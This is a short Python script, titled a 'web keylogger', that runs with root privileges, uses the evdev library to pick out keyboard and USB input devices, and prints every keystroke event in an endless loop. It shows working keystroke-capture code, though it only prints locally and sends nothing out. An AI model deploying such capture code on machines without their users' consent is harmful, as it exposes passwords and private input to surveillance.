'''

Author: Gustavo Martin Vela
Python-web-keylogger
2013

IT IS NECESSARY TO PLAY THIS SCRIPT WITH ROOT PRIVILEGES (SUDO)
'''


# To install evdev library: sudo pip install evdev
# evdev library webpage: http://pythonhosted.org/evdev/
from evdev import InputDevice, list_devices, categorize, ecodes
# Necessary to read well multiple devices
from select import select

# This list is to enter the strings in uppercase that we want to search
wanted_devices_string_list = ["USB", "KEYBOARD"]
# This dictionnary is to save the devices that maps with our strings
interesting_devices_dict = {}
# This mapping maps each device to /dev/input/eventX
devices = map(InputDevice, list_devices())

# A new list to save only the wanted devices 
wanted_devices_list = []
# Searching in all the devices
for dev in devices:
	# Converting device names to uppercase to process well
	name_upper = dev.name.upper()
	# Iterating over our wanted strings
	for wanted_string in wanted_devices_string_list:
		# Searching our string in the names of the devices
		if wanted_string in name_upper:
			# Saving in the dictionnary
			interesting_devices_dict[wanted_string] = dev
			# Put all the wanted devives in the new tuple
			wanted_devices_list.append(dev.fn)
	#print( '%-20s %-32s %s' % (dev.fn, dev.name, dev.phys) )

# Searching in all the interesting devices
#for key, device in interesting_devices_dict.iteritems():
	# Mapping all the capabilities of the device
	#print "%s\n%s" % (key, device.capabilities(verbose=True))

# Mapping only our interesting devices
devices = map(InputDevice, wanted_devices_list)
devices = {dev.fd : dev for dev in devices}

# Iterating infinitely over events from our interesting devices
while True:
	# Interface to Unix select() system call
	r,w,x = select(devices, [], [])
	# searching only the interesting devices events 
	for fd in r:
		for event in devices[fd].read():
			# Displaying the events categorized
			print(categorize(event))